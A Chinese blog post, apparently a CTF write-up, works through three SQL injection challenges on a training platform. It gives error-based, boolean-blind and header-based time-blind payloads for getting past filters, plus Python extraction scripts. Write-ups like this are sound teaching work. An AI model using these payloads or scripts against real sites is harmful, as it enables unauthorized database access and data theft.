@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>实验吧几道注入题 | Altm4nz</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="wp" />
+  
+  
+  
+  
+  <meta name="description" content="0x1 加了料的报错注入url=http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;web&#x2F;baocuo&#x2F;index.php提示了是报错注入，进行了一波FUZZ:username过滤了 =#-()">
+<meta name="keywords" content="wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="实验吧几道注入题">
+<meta property="og:url" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;03&#x2F;08&#x2F;%E5%AE%9E%E9%AA%8C%E5%90%A7%E5%87%A0%E9%81%93%E6%B3%A8%E5%85%A5%E9%A2%98&#x2F;index.html">
+<meta property="og:site_name" content="Altm4nz">
+<meta property="og:description" content="0x1 加了料的报错注入url=http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;web&#x2F;baocuo&#x2F;index.php提示了是报错注入，进行了一波FUZZ:username过滤了 =#-()">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-11-02T05:50:01.442Z">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Altm4nz" type="application/atom+xml">
+  
+  <link rel="icon" href="/css/images/pokemon.ico">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+    
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+  <link rel="stylesheet" href="/css/fashion.css" >
+  <link rel="stylesheet" href="/css/glyphs.css" >
+
+</head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+
+
+<header id="allheader" class="site-header" role="banner" 
+   >
+  <div class="clearfix container">
+      <div class="site-branding">
+
+          <h1 class="site-title">
+            
+              <a href="/" title="Altm4nz" rel="home"> Altm4nz </a>
+            
+          </h1>
+          
+          
+            
+          <nav id="main-navigation" class="main-navigation" role="navigation">
+            <a class="nav-open">Menu</a>
+            <a class="nav-close">Close</a>
+
+            <div class="clearfix sf-menu">
+              <ul id="main-nav" class="menu sf-js-enabled sf-arrows"  style="touch-action: pan-y;">
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/">Home</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/archives">Archives</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/tags">Tags</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/friend">friend</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/about">About</a> </li>
+                    
+              </ul>
+            </div>
+          </nav>
+
+      </div>
+  </div>
+</header>
+
+
+  <div id="container">
+    <div id="wrap">
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-实验吧几道注入题" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      实验吧几道注入题
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2018/03/08/%E5%AE%9E%E9%AA%8C%E5%90%A7%E5%87%A0%E9%81%93%E6%B3%A8%E5%85%A5%E9%A2%98/" class="article-date">
+	  <time datetime="2018-03-08T05:06:57.000Z" itemprop="datePublished">March 8, 2018</time>
+	</a>
+
+       
+      
+	<span id="busuanzi_container_page_pv">
+	  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+	</span>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x1-加了料的报错注入"><a href="#0x1-加了料的报错注入" class="headerlink" title="0x1 加了料的报错注入"></a>0x1 加了料的报错注入</h2><p>url=<a href="http://ctf5.shiyanbar.com/web/baocuo/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/baocuo/index.php</a><br>提示了是报错注入，进行了一波FUZZ:<br>username过滤了 =#-()</p>
+<a id="more"></a>
+<p>password过滤了所有报错函数名 ExtractValue、UpdateXml等,substr  mid  left right union limit like。<br>再结合提示的sql语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql="<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'$username'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$password'</span><span class="string">"</span></span><br></pre></td></tr></table></figure>
+<p>我们可以将函数名放在username，()放在password里，构造：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">username</span>=<span class="string">' or updatexml/*&amp;password=*/(1,concat(0x3a,(select user())),1) or '</span></span><br></pre></td></tr></table></figure>
+<p>这样sql语句就变成了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql="<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">''</span> <span class="keyword">or</span> updatexml<span class="comment">/*' and password='*/</span>(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">''</span><span class="string">"</span></span><br></pre></td></tr></table></figure>
+<p>注释掉了中间的内容并且绕过了waf。<br>因为过滤了like和= ，这里用regexp代替</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username=' or updatexml<span class="comment">/*&amp;password=*/</span>(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema regexp <span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">' //ffll44jj,users</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">username='</span> <span class="keyword">or</span> updatexml<span class="comment">/*&amp;password=*/</span>(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name regexp  <span class="string">'ffll44jj'</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">' //value</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">username='</span> <span class="keyword">or</span> updatexml<span class="comment">/*&amp;password=*/</span>(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">value</span>) <span class="keyword">from</span> ffll44jj),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">' //flag&#123;err0r_b4sed_sqli_+_hpf&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>另外 看了Pcat大佬的WP，发现password处EXP没有过滤，可以直接在password处注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=&amp;password='or exp(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x)) <span class="keyword">or</span> <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">username=&amp;password='</span><span class="keyword">or</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">value</span>) <span class="keyword">from</span> ffll44jj)x)) <span class="keyword">or</span> <span class="string">'</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x2-认真一点"><a href="#0x2-认真一点" class="headerlink" title="0x2 认真一点"></a>0x2 认真一点</h2><p>url=<a href="http://ctf5.shiyanbar.com/web/earnest/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/earnest/index.php</a><br>明显的BOOL盲注<br>payload:</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">id</span>=<span class="number">0</span><span class="string">'oorr'</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>过滤了一大堆东西<br>用括号代替空格，双写or绕过，过滤了逗号，mid无法使用，只能用regexp倒叙匹配。<br>python脚本:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/web/earnest/index.php"</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string.letters+<span class="string">"0123456789"</span>+<span class="string">"!@#^&amp;()&#123;&#125;=+`~_,/."</span>:</span><br><span class="line">        <span class="comment">#payload="0'oorr(select(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))regexp('%s$'))oorr'1'='" //fiaguser</span></span><br><span class="line">        <span class="comment">#payload="0'oorr(select(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name='fiag')regexp('%s$'))oorr'1'='" //fl$4g</span></span><br><span class="line">        payload=<span class="string">"0'oorr(select(select(fl$4g)from(fiag))regexp('%s$'))oorr'1'='"</span>%(j+flag) </span><br><span class="line">        data = &#123; <span class="string">"id"</span>:payload</span><br><span class="line">        &#125;        </span><br><span class="line">        r =requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'You are in'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            flag = j+flag</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> i</span><br></pre></td></tr></table></figure>
+<p>将逗号放到最后因为逗号*和$是通配符，如果出现了这几个符号，就要猜他到底是什么了。。。还没想到更准确的方法。<br>得出flag：flag{haha~you win!}</p>
+<h2 id="0x3-who-are-you"><a href="#0x3-who-are-you" class="headerlink" title="0x3 who are you"></a>0x3 who are you</h2><p>首页显示IP，抓包修改XFF，果然ip是从XFF处取值。<br>尝试 </p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-FORWARDED-<span class="string">FOR:</span><span class="string">' or sleep(5) or '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>sleep成功，尝试时间盲注发现逗号被过滤了。<br>那么用select case when<br>最终payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-FORWARDED-FOR:' or (<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (<span class="number">1</span>) <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">5</span>) <span class="keyword">end</span>) <span class="keyword">or</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure>
+
+<p>附上盲注脚本:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/web/wonderkun/index.php"</span></span><br><span class="line"><span class="comment">#payload="' or+(select case when (substring((select(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))) from %s for 1)='%s') then sleep(5) else 0 end) or '1'='1"</span></span><br><span class="line"><span class="comment">#payload="' or+(select case when (substring((select(select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666C6167))) from %s for 1)='%s') from %s for 1)='%s') then sleep(5) else 0 end) or '1'='1"</span></span><br><span class="line">payload = <span class="string">"' or+(select case when (substring((select flag from flag) from %s for 1)='%s') then sleep(5) else 0 end) or '1'='1"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string.letters+<span class="string">"0123456789"</span>+<span class="string">"!@#^&amp;()&#123;&#125;=+`~_,/."</span>:</span><br><span class="line">        payload1 = payload%(i,j)</span><br><span class="line">        header=&#123;</span><br><span class="line">        <span class="string">"X-Forwarded-For"</span>:payload1</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url=url,timeout=<span class="number">4</span>,headers=header)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> i</span><br></pre></td></tr></table></figure>
+
+
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+      
+    </footer>
+    <hr class="entry-footer-hr">
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/04/07/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E5%AD%A6%E4%B9%A0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          时间盲注学习
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/03/03/hgame-week4/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">hgame-week4</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+      <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1-加了料的报错注入"><span class="nav-number">1.</span> <span class="nav-text">0x1 加了料的报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-认真一点"><span class="nav-number">2.</span> <span class="nav-text">0x2 认真一点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x3-who-are-you"><span class="nav-number">3.</span> <span class="nav-text">0x3 who are you</span></a></li></ol>
+    
+    </div>
+  </aside>
+
+</section>
+        
+      </div>
+
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/friend" class="mobile-nav-link">Friend</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    <footer id="footer" class="site-footer">
+  
+
+  <div class="clearfix container">
+      <div class="site-info">
+	      &copy; 2019 Altm4nz All Rights Reserved.
+        
+            <span id="busuanzi_container_site_uv">  
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+            </span>
+          
+      </div>
+      <div class="site-credit">
+        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
+      </div>
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+
+
+    <!-- headerblur min height -->
+    
+    
+</script>
+    
+<div style="display: none;">
+  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+</div>
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+<script src="/js/bootstrap.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+
+
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+  </div>
+
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js" async=""></script>
+</body>
+</html>
